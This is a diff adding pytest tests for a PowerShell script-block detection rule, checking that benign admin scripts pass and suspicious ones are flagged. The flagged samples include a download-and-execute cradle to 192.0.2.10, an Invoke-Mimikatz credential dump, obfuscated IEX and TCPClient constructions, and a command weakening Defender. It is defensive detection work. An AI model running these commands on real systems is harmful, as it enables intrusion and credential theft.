@@ -338,3 +338,39 @@ def test_powershell_with_an_abbreviated_encoded_command_a_hidden_window_or_a_cra
     ]
     found = fired(store, "win-powershell-encoded-command", rows)
     assert len(found) == 4 and {f["severity"] for f in found} == {"medium"}
+
+
+POWERSHELL_LOG = ("Microsoft-Windows-PowerShell", "Microsoft-Windows-PowerShell/Operational")
+
+
+def script_block(text: str) -> dict:
+    return event(4104, {"MessageNumber": "1", "MessageTotal": "1", "ScriptBlockText": text, "ScriptBlockId": str(uuid.uuid4())}, source=POWERSHELL_LOG)
+
+
+def test_an_administration_script_is_not_suspicious_for_the_language_features_and_cmdlets_it_uses(store):
+    rows = [
+        script_block(
+            "$names = (Get-CimInstance -ClassName Win32_Service).Name -join ','\n"
+            "Add-Type -AssemblyName System.IO.Compression.FileSystem\n"
+            "$path = $env:TEMP.Replace('\\\\', '/')\n"
+            "Invoke-Command -ComputerName APP01 -Credential $cred -ScriptBlock { Get-Service }\n"
+        ),
+        script_block("Set-MpPreference -SignatureUpdateInterval 4\nInvoke-WebRequest -Uri https://updates.example.test/agent.msi -OutFile $msi"),
+        script_block(
+            "powershell.exe -NoProfile -ExecutionPolicy Bypass -File .\\inventory.ps1; [char]65; Compress-Archive -Path logs -DestinationPath logs.zip"
+        ),
+    ]
+    assert fired(store, "win-powershell-suspicious-scriptblock", rows) == []
+
+
+def test_a_script_block_with_a_cradle_an_offensive_tool_or_an_obfuscation_idiom_is_reported(store):
+    rows = [
+        script_block("IEX (New-Object Net.WebClient).DownloadString('http://192.0.2.10/a.ps1')"),
+        script_block("Invoke-Mimikatz -Command 'sekurlsa::logonpasswords'"),
+        script_block("$a = ('gnirtS46esaBmorF'[-1..-16] -join '')"),
+        script_block("&( $PSHome[4]+$PSHome[34]+'X') ( [string]::join('', ( (36,97) -AS [ChAR[]])) )"),
+        script_block("& ((\"{1}{0}\" -f 'ject','New-Ob')) Net.Sockets.TCPClient"),
+        script_block("Set-MpPreference -HighThreatDefaultAction 6 -Force"),
+    ]
+    found = fired(store, "win-powershell-suspicious-scriptblock", rows)
+    assert len(found) == 6 and {f["severity"] for f in found} == {"high"}
